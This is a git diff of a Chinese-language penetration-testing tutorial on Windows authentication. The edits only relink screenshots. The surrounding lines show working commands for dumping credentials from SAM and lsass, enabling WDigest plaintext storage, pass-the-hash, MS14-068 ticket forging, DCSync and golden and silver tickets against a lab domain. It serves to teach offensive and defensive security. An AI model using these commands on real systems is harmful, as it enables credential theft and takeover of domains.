@@ -187,7 +187,7 @@ wce.exe -lv
 QuarkPwDump.exe -dhl
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019215856-97b29a6a-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019215856-97b29a6a-f278-1.png)
+![20191019215856-97b29a6a-f278-1](Windows认证及哈希传递攻击/20191019215856-97b29a6a-f278-1.png)
 
 **工具地址：**https://github.com/quarkslab/quarkspwdump
 
@@ -201,7 +201,7 @@ reg save hklm\system system.hive
 reg save hklm\security security.hive
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019215919-a57e0558-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019215919-a57e0558-f278-1.png)
+![20191019215919-a57e0558-f278-1](Windows认证及哈希传递攻击/20191019215919-a57e0558-f278-1.png)
 
 然后导入到本地的mimikatz中：
 
@@ -209,7 +209,7 @@ reg save hklm\security security.hive
 lsadump::sam /system:system.hive /sam:sam.hive
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019215937-b015ae26-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019215937-b015ae26-f278-1.png)
+![20191019215937-b015ae26-f278-1](Windows认证及哈希传递攻击/20191019215937-b015ae26-f278-1.png)
 
 ## mimikatz
 
@@ -222,7 +222,7 @@ privilege::debug
 sekurlsa::logonpasswords
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019215953-b95bfb34-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019215953-b95bfb34-f278-1.png)
+![20191019215953-b95bfb34-f278-1](Windows认证及哈希传递攻击/20191019215953-b95bfb34-f278-1.png)
 
 可以看到不仅抓取到了本机的administrator的密码，还抓取到了域管理员的密码，在域渗透的过程中会用到
 
@@ -236,17 +236,17 @@ sekurlsa::logonpasswords
 procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220011-c4848af8-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220011-c4848af8-f278-1.png)
+![20191019220011-c4848af8-f278-1](Windows认证及哈希传递攻击/20191019220011-c4848af8-f278-1.png)
 
 之后可以下载到本地导入到mimikatz中进行读取
 
 我在xp上导出，在win10上导入会报错
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220033-d1b0c46c-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220033-d1b0c46c-f278-1.png)
+![20191019220033-d1b0c46c-f278-1](Windows认证及哈希传递攻击/20191019220033-d1b0c46c-f278-1.png)
 
 查了一下发现需要注意的一点是导出的平台和导入的平台不同时会报错，可以看一下mimikatz官方的解释：
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220048-da7a7f34-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220048-da7a7f34-f278-1.png)
+![20191019220048-da7a7f34-f278-1](Windows认证及哈希传递攻击/20191019220048-da7a7f34-f278-1.png)
 
 在另一台xp中就可以成功导出和读取：
 
@@ -255,7 +255,7 @@ sekurlsa::minidump lsass.dmp
 sekurlsa::logonpasswords
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220101-e2685c84-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220101-e2685c84-f278-1.png)
+![20191019220101-e2685c84-f278-1](Windows认证及哈希传递攻击/20191019220101-e2685c84-f278-1.png)
 
 工具地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
 
@@ -265,7 +265,7 @@ sekurlsa::logonpasswords
 
 测试只有极少的杀软会报毒，但本地测试时win10的defender会报毒，是否免杀视情况而定吧。需要administrator及以上的权限。
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220117-ebe60360-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220117-ebe60360-f278-1.png)
+![20191019220117-ebe60360-f278-1](Windows认证及哈希传递攻击/20191019220117-ebe60360-f278-1.png)
 
 然后将打包的`debug824.bin`下载到本地，修改扩展名为`gz`，将解压后得到的文件导入mimikatz
 
@@ -276,7 +276,7 @@ sekurlsa::minidump <要导入的文件名>
 sekurlsa::logonPasswords full
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220136-f6f51610-f278-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220136-f6f51610-f278-1.png)
+![20191019220136-f6f51610-f278-1](Windows认证及哈希传递攻击/20191019220136-f6f51610-f278-1.png)
 
 但是用户明文密码处是`(null)`，查了一下发现原来Windows Server 2012 R2以上的系统默认不向内存中保存明文密码了。这个我们可以通过修改注册表来解决（需要权限）：
 
@@ -286,7 +286,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 然后重启win10，用户重新登录再导出一次，然后在mimikatz中导入就可以看到明文的密码：
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220158-03f03174-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220158-03f03174-f279-1.png)
+![20191019220158-03f03174-f279-1](Windows认证及哈希传递攻击/20191019220158-03f03174-f279-1.png)
 
 **工具地址：**https://github.com/GhostPack/SharpDump
 
@@ -314,7 +314,7 @@ exploit
 
 注意`SMBPass`参数要写成`<LM Hash>:<NTLM Hash>`的形式，exploit后可以成功拿到目标计算机的meterpreter会话
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220242-1e262c56-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220242-1e262c56-f279-1.png)
+![20191019220242-1e262c56-f279-1](Windows认证及哈希传递攻击/20191019220242-1e262c56-f279-1.png)
 
 ## mimikatz
 
@@ -324,7 +324,7 @@ exploit
 
 首先我们假设在WIN2003上我们使用wce抓取到了administrator的NTLM Hash
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220317-3352fa32-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220317-3352fa32-f279-1.png)
+![20191019220317-3352fa32-f279-1](Windows认证及哈希传递攻击/20191019220317-3352fa32-f279-1.png)
 
 然后我们到WINXP中使用mimikatz进行hash传递攻击：
 
@@ -333,7 +333,7 @@ privilege::debug
 sekurlsa::pth /user:<用户名> /domain:<远程服务器地址> /ntlm:<用户的NTLM Hash>
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220333-3c876908-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220333-3c876908-f279-1.png)
+![20191019220333-3c876908-f279-1](Windows认证及哈希传递攻击/20191019220333-3c876908-f279-1.png)
 
 之后会弹出一个cmd的窗口，我们在这个cmd中可以进行对目标计算机的一些操作，如列出WIN2003的c盘文件：
 
@@ -341,7 +341,7 @@ sekurlsa::pth /user:<用户名> /domain:<远程服务器地址> /ntlm:<用户的
 dir \\192.168.206.101\c$
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220348-45dd1606-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220348-45dd1606-f279-1.png)
+![20191019220348-45dd1606-f279-1](Windows认证及哈希传递攻击/20191019220348-45dd1606-f279-1.png)
 
 ### 域环境
 
@@ -360,7 +360,7 @@ sekurlsa::pth /user:<域管理员名> /domain:<所属域名称> /ntlm:<域管的
 dir \\WIN08\$c
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220408-51c107fc-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220408-51c107fc-f279-1.png)
+![20191019220408-51c107fc-f279-1](Windows认证及哈希传递攻击/20191019220408-51c107fc-f279-1.png)
 
 # 票据传递攻击(Pass-The-Ticket)
 
@@ -378,11 +378,11 @@ dir \\WIN08\$c
 
 首先我们使用一个普通域用户test登录到WIN7上，并记录该用户的sid：
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220425-5ba8e794-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220425-5ba8e794-f279-1.png)
+![20191019220425-5ba8e794-f279-1](Windows认证及哈希传递攻击/20191019220425-5ba8e794-f279-1.png)
 
 此时访问域控的C盘根目录是没有权限的：
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220444-66d69b16-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220444-66d69b16-f279-1.png)
+![20191019220444-66d69b16-f279-1](Windows认证及哈希传递攻击/20191019220444-66d69b16-f279-1.png)
 
 我们使用MS-14068.exe，生成票据：
 
@@ -390,7 +390,7 @@ dir \\WIN08\$c
 MS14-068.exe -u <用户名>@<所属域名称> -s <此用户的sid> -d <域控地址> -p <此用户的密码>
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220502-71e2c002-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220502-71e2c002-f279-1.png)
+![20191019220502-71e2c002-f279-1](Windows认证及哈希传递攻击/20191019220502-71e2c002-f279-1.png)
 
 然后再使用mimikatz将票据导入：
 
@@ -398,7 +398,7 @@ MS14-068.exe -u <用户名>@<所属域名称> -s <此用户的sid> -d <域控地
 kerberos::ptc TGT_test@centoso.com.ccache
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220523-7dfc44c6-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220523-7dfc44c6-f279-1.png)
+![20191019220523-7dfc44c6-f279-1](Windows认证及哈希传递攻击/20191019220523-7dfc44c6-f279-1.png)
 
 导入之后便可以成功访问域控WIN08的C盘根目录（还可以访问该域中的其他服务器）：
 
@@ -406,7 +406,7 @@ kerberos::ptc TGT_test@centoso.com.ccache
 dir \\WIN08\c$
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220541-88c14d8e-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220541-88c14d8e-f279-1.png)
+![20191019220541-88c14d8e-f279-1](Windows认证及哈希传递攻击/20191019220541-88c14d8e-f279-1.png)
 
 还可以使用微软的SysinternalsSuite工具包中的psexec.exe来获取WIN08的shell：
 
@@ -414,7 +414,7 @@ dir \\WIN08\c$
 Psexec64.exe \\WIN08 cmd.exe
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220649-b1901d94-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220649-b1901d94-f279-1.png)
+![20191019220649-b1901d94-f279-1](Windows认证及哈希传递攻击/20191019220649-b1901d94-f279-1.png)
 
 **PS：**WINXP与WIN2003均测试失败，mimikatz无法导入生成的TGT
 
@@ -434,7 +434,7 @@ privilege::debug
 lsadump::dcsync /domain:centoso.com /user:krbtgt
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220709-bd41bcec-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220709-bd41bcec-f279-1.png)
+![20191019220709-bd41bcec-f279-1](Windows认证及哈希传递攻击/20191019220709-bd41bcec-f279-1.png)
 
 拿到krbtgt的NTLM Hash和sid后，我们就可以在一台普通域服务器上生成黄金票据并导入：
 
@@ -442,7 +442,7 @@ lsadump::dcsync /domain:centoso.com /user:krbtgt
 kerberos::golden /user:<域管> /domain:<所属域名称> /sid:<krbtgt的sid> /krbtgt:<krbtgt的NTLM Hash> /ptt
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220729-c91f6bb8-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220729-c91f6bb8-f279-1.png)
+![20191019220729-c91f6bb8-f279-1](Windows认证及哈希传递攻击/20191019220729-c91f6bb8-f279-1.png)
 
 也可以先将黄金票据生成为ticket.kirbi文件后再导入：
 
@@ -451,7 +451,7 @@ kerberos::golden /user:<域管> /domain:<所属域名称> /sid:<krbtgt的sid> /k
 kerberos:ptt ticket.kirbi
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220755-d90d4f4a-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220755-d90d4f4a-f279-1.png)
+![20191019220755-d90d4f4a-f279-1](Windows认证及哈希传递攻击/20191019220755-d90d4f4a-f279-1.png)
 
 查看本机已有的票据：
 
@@ -459,7 +459,7 @@ kerberos:ptt ticket.kirbi
 kerberos::list
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220821-e83d39ee-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220821-e83d39ee-f279-1.png)
+![20191019220821-e83d39ee-f279-1](Windows认证及哈希传递攻击/20191019220821-e83d39ee-f279-1.png)
 
 尝试将域控的C盘映射到本地的K盘：
 
@@ -467,7 +467,7 @@ kerberos::list
 net use K: \\WIN08\c$
 ```
 
-[![img](https://xzfile.aliyuncs.com/media/upload/picture/20191019220846-f74b0cb8-f279-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191019220846-f74b0cb8-f279-1.png)
+![20191019220846-f74b0cb8-f279-1](Windows认证及哈希传递攻击/20191019220846-f74b0cb8-f279-1.png)
 
 ## 白银票据(Silver Ticket)
 
@@ -503,5 +503,5 @@ kerberos::golden /domain:<所属域名称> /sid:<服务账户sid> /target:<目�
 
 
 
-原文地址：https://xz.aliyun.com/t/6600  侵删！
+***原文地址：https://xz.aliyun.com/t/6600  侵删！***
 
